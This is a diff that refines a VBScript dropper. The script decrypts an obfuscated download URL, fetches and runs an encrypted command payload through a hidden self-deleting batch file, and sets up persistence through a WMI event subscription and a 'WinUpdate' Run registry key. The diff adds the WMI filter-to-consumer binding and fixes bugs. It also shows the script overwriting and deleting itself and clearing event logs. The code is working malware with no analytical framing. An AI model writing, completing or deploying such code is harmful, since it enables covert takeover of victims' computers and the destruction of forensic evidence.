@@ -70,7 +70,7 @@ Sub ExecuteWithRandomDelay(command)
     Set execMethod = wmi.Get("Win32_Process").Methods_("Create")
     Set execParams = execMethod.InParameters.SpawnInstance_
     
-    ' Create command with ping-based delay (fixed calculation)
+    ' Create command with ping-based delay
     execParams.CommandLine = "%COMSPEC% /c ping 127.0.0.1 -n " & (delayMinutes * 60 + 1) & _
                            " >nul & " & command
     
@@ -87,19 +87,35 @@ End Sub
 '==============================================
 
 Function HexToString(hexStr)
-    Dim i, result
+    Dim i, result, hexByte
+    result = ""
     For i = 1 To Len(hexStr) Step 2
-        result = result & Chr(CLng("&H" & Mid(hexStr, i, 2)))
+        hexByte = Mid(hexStr, i, 2)
+        result = result & Chr(CLng("&H" & hexByte))
     Next
     HexToString = result
 End Function
 
+Function BytesToString(bytes)
+    On Error Resume Next
+    Dim stream
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1  ' Binary
+    stream.Open
+    stream.Write bytes
+    stream.Position = 0
+    stream.Type = 2  ' Text
+    stream.Charset = "iso-8859-1"
+    BytesToString = stream.ReadText
+    stream.Close
+End Function
+
 Sub DownloadExecuteCMD()
     On Error Resume Next
-    Dim http, shell, encUrl, tempFile, decryptedCMD, typeLib, fso, stream
+    Dim shell, encUrl, tempFile, decryptedCMD, typeLib, fso, stream, http
     
     ' XOR-encrypted download URL (Key: "Shadow")
-    encUrl = "9C8D9E9B939E8D9C8DDF9A8CDF9E939E8DDF9A8CDF9E939E8D"
+    encUrl = "3B1C15141C4D7C47060D1B1F260A4F07001A7C2C13050418251C090159033B4735261A307C0A0D0B0D583E0912100A057C18001D0318320C4F060619"
     encUrl = XorDecrypt(HexToString(encUrl), "Shadow")
     
     ' Generate random temp filename
@@ -114,7 +130,7 @@ Sub DownloadExecuteCMD()
     ' Read and decrypt in memory
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1 ' Binary
+    stream.Type = 1  ' Binary
     stream.Open
     stream.LoadFromFile tempFile
     decryptedCMD = XorDecrypt(BytesToString(stream.Read), "CmdKey")
@@ -123,26 +139,13 @@ Sub DownloadExecuteCMD()
     ' Execute via temporary self-deleting batch
     ExecuteTempBatch decryptedCMD
     
-    ' Save persistent payload copy
+    ' Save persistent payload copy for WMI
     SavePersistentPayload decryptedCMD
     
     ' Cleanup encrypted file
-    fso.DeleteFile tempFile, True
+    If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
     On Error GoTo 0
 End Sub
-
-Function BytesToString(bytes)
-    Dim stream
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1 ' Binary
-    stream.Open
-    stream.Write bytes
-    stream.Position = 0
-    stream.Type = 2 ' Text
-    stream.Charset = "iso-8859-1" ' Preserve binary integrity
-    BytesToString = stream.ReadText
-    stream.Close
-End Function
 
 Sub SavePersistentPayload(cmdContent)
     Dim fso, shell, persistentPath
@@ -172,7 +175,9 @@ Sub ExecuteTempBatch(cmdContent)
                    "del /f /q """ & tempPath & """"
     
     ' Write and execute
-    fso.CreateTextFile(tempPath, True).Write batchContent
+    Set file = fso.CreateTextFile(tempPath, True)
+    file.Write batchContent
+    file.Close
     shell.Run """" & tempPath & """", 0, False
 End Sub
 
@@ -201,6 +206,12 @@ Sub SetStealthPersistence()
                            shell.ExpandEnvironmentStrings("%TEMP%\WinUpdate.cmd") & """, 0, False"
     consumer.Put_
     
+    ' Link filter to consumer
+    Set binding = wmi.Get("__FilterToConsumerBinding").SpawnInstance_
+    binding.Filter = filter.Path_
+    binding.Consumer = consumer.Path_
+    binding.Put_
+    
     ' Registry Persistence
     shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdate", _
                    shell.ExpandEnvironmentStrings("%TEMP%\WinUpdate.cmd"), "REG_SZ"
@@ -220,12 +231,16 @@ Sub AdvancedCleanup()
     Set wmi = GetObject("winmgmts:\\.\root\cimv2")
     
     ' Overwrite script before deletion
-    fso.OpenTextFile(WScript.ScriptFullName, 2).Write String(5000, "X")
+    If fso.FileExists(WScript.ScriptFullName) Then
+        Set file = fso.OpenTextFile(WScript.ScriptFullName, 2)
+        file.Write String(5000, "X")
+        file.Close
+    End If
     
     ' Delete with delay
     Set objMethod = wmi.Get("Win32_Process").Methods_("Create")
     Set objParams = objMethod.InParameters.SpawnInstance_
-    objParams.CommandLine = "cmd /c ping 127.0.0.1 -n 30 >nul & del """ & WScript.ScriptFullName & """"
+    objParams.CommandLine = "cmd /c ping 127.0.0.1 -n 30 >nul & del /f /q """ & WScript.ScriptFullName & """"
     wmi.ExecMethod "Win32_Process", "Create", objParams
     
     ' Clear relevant event logs
